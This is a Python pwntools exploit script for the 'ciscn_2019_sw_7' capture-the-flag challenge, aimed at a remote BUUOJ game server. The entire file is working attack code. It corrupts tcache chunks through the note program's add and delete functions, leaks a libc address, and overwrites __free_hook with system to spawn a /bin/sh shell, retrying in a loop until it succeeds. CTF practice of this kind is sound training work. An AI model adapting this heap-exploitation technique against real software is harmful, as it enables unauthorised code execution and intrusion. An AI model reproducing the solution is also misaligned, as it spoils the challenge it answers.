# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ciscn_2019_sw_7'
os.system('chmod +x %s'%binary)
context.binary = binary
# context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28256'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , content = 'a'*8):
    cmd(1)
    sla('The size of note:' , size)
    sla('The content of note:' , content)

def show(idx ):
    cmd(2)
    sla('Index:' , idx)

def delete(idx ):
    cmd(4)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0) #0
    add(0x60) #1
    add(0x60) #2
    add(0x60) #3
    add(0x60) #4

    delete(2)
    delete(1)
    delete(0)
    add(0 , flat(0,0,0x71) + '\x00' + '\n') #0
    # dbg()
    add(0x60) #1
    add(0x60 , flat(0x251) + '\x00'*8+'\x07'*0x38) #2

    delete(0)
    add(0 , flat(0,0,0x70*3+1)) #0
    delete(1)

    add(0x60) #1
    add(0x60) #5
    show(3)
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    delete(5)
    delete(1)
    delete(0)

    add(0 , flat(0,0,0x71,__free_hook-8))
    add(0x60 , 'bbb')
    delete(0)
    add(0x60 , p64(system_addr))
    add(0 , flat(0,0,0x71,'/bin/sh\x00'))

    delete(1)
    # dbg()

    # p.success(getShell())
    p.interactive()

# attack()

def boom( pwn ):
    context.update( os = 'linux', arch = 'amd64',timeout = 1)
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

boom(attack)

'''
@File    :   ciscn_2019_sw_7.py
@Time    :   2022/01/31 19:25:57
@Author  :   Niyah 
'''